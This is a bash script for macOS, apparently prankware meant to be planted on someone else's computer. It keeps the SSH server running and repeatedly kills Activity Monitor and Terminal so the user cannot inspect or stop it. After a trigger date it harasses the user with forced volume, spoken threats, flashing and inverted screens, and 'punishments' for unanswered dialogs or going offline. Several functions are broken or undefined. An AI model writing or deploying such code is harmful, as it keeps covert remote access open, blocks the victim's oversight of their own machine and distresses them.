#!/bin/bash

#makes sure ssh is turned on
#if it isn't turned on, it starts talking back to the person
ssh()
{
	while true; do 
	a=`netstat -an | grep \*\.22 | grep LISTEN | grep -v grep | wc -l | awk '{print $1}'`
	if [ $a = "0" ]
		then osascript -e "set volume 5"
		killall "Activity Monitor"
		killall "Terminal"
		say "s s h or the system session handler should not be turned off"
	else
		killall "Activity Monitor"
	fi
	sleep 2
	done
}

#helper class: retrieves volume in raw format
retrieve_volume()
{

	volumecheck=`/usr/bin/osascript << EOT
		tell application "System events"
			set volumelevel to get volume settings
		end tell
EOT`
	echo  "$volumecheck"
}

check_volume()
{
	before=`retrieve_volume`
	
	after=`retrieve_volume`
	if [ "$before" != "$after" ]; then
		say not equal
	fi
}

questionnum=3
#asks questions randomly. Should ask different questions (yet to be implemented)
ask_question()
{
	rm ~/googleit19104.txt
	
	message="Do you like frogs? Answer within 10 seconds or listen to annoying music!"
	message2="Do you like this question?"
	message3="Do you like typing in words really fast?"
	button=`/usr/bin/osascript << EOT
		tell application "Terminal"
    			beep
    			display dialog "$message" buttons {"Yes", "No"} \
                            default button "No" giving up after 10
    			set result to button returned of result
		end tell
	EOT`

	#if the reply is Yes, the file is created
	if [ $button = "Yes" ]; then
		touch ~/googleit19104.txt
	fi

	question=$(($question + 1))
}

#asks a question every 15 minutes
#if they don't answer according to the answer predetermined, they will receive a "spaces" twirling
punishment()
{	
	#show desktop
	osascript -e 'tell application "System Events" to key code 103'
	ask_question
	osascript -e 'tell application "System Events" to key code 103'
	
	if [ ! -f ~/googleit19104.txt ]; then
		hi=0
		while [ $hi -lt 10 ]; do
		osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 125 using {option down}' -e 'end tell' -e 'end tell'
		sleep .1
		osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 124 using {option down}' -e 'end tell' -e 'end tell'
		sleep .1
		osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 126 using {option down}' -e 'end tell' -e 'end tell'
		sleep .1
		osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 123 using {option down}' -e 'end tell' -e 'end tell'
		sleep .1
		hi=$(($hi + 1))
		done
	fi
}


#if user is not connected to the internet
#gives them 15 seconds to connect before voice warning
#if it pasts 1 minute, screen starts fading in and out
#if it pasts 2 minute, screen goes crazy
internetcheck()
{
	while true; do
		ETH=`ifconfig en0 | grep ' active'| grep -v grep | wc -l | awk '{print $1}'`
	    	WIFI=`ifconfig en1 | grep ' active'| grep -v grep | wc -l | awk '{print $1}'`
		
		sleep 1	
		TIMEZ=`date +%s`
		CRAZYFLASH=0
		MEDIUMFLASH=0
		FIRSTREP=1
		SECONDREP=1
		THIRDREP=1
		while [ $ETH -eq 0 ] && [ $WIFI -eq 0 ]; do
			if [ $MEDIUMFLASH = "1" ]; then
                                sleep .2
                                ./brightness 0
                                sleep 1
                                ./brightness 1
                                sleep .2
                        fi
			
                        if [ $CRAZYFLASH = "1" ]; then
                                osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 28 using {command down, option down, control down}' -e 'end tell' -e 'end tell'
                                sleep 1
                                osascript -e 'tell application "System Events"' -e 'tell application processes' -e 'key code 28 using {command down, option down, control down}' -e 'end tell' -e 'end tell'
                                sleep 1
                        fi
			
			NOW=`date +%s`	
			DIFF=$((NOW - TIMEZ))
			echo $DIFF
			if [[ $DIFF -gt 30 && $THIRDREP -eq 1 ]]; then
				CRAZYFLASH=1
				THIRDREP=0
			else
				if [[ $DIFF -gt 20 && $SECONDREP -eq 1 ]]; then
					MEDIUMFLASH=1
					osascript -e "set volume 5"
					say "Do you really want to listen to annoying music?"
					SECONDREP=0
				else
					if [[ $DIFF -gt 10  &&  $FIRSTREP -eq 1 ]]; then
						osascript -e "set volume 5"
						say "Warning. Warning. Internet should not be turned off"
						FIRSTREP=0
					fi
				fi
			fi

		ETH=`ifconfig en0 | grep ' active'| grep -v grep | wc -l | awk '{print $1}'`
                WIFI=`ifconfig en1 | grep ' active'| grep -v grep | wc -l | awk '{print $1}'` 
		done
	done
}

#every hour plays 5 second clip
hourly_chime()
{
	while true; do
		if [ `date +%M` = "00" ]; then
			pause 5
			osascript -e "set volume 6"
			afplay ~/sounds/ring.mp3
			osascript -e "set volume 0"
			sleep 61
		fi	
	done
}

#plays random voice clips every 2-5 minutes randomly
sound() {

prefix=~/sounds/
loc=(file1 file2 file3 file4 file5 file6)

sleep 60

while true; do
	afplay $prefix${loc[$((RANDOM%${#loc[@]}))]}.m4v
	sleep $((($RANDOM%5+2)))
done
}

#set when to have these features enabled. 
#Could be annoying if all are used at once...
#Change date to something in the future
if [ `date +%s` -gt 1272045600 ]; then
	hello &
	sound &
	hourly_chime &
	internetcheck &
fi

check_volume &
